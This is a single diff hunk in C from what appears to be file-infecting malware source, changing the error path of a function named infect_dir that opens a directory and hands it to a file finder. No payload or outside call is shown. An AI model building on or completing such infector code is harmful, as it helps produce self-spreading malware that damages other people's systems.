@@ -5,7 +5,7 @@ void infect_dir(t_data data, char *dir)
 	int fd;
 	fd = OPEN(dir, O_RDONLY | O_DIRECTORY);
 	if (fd < 0)
-		payload_end();
+		return ;
 	finder(data, fd, dir);
 	CLOSE(fd);
 }
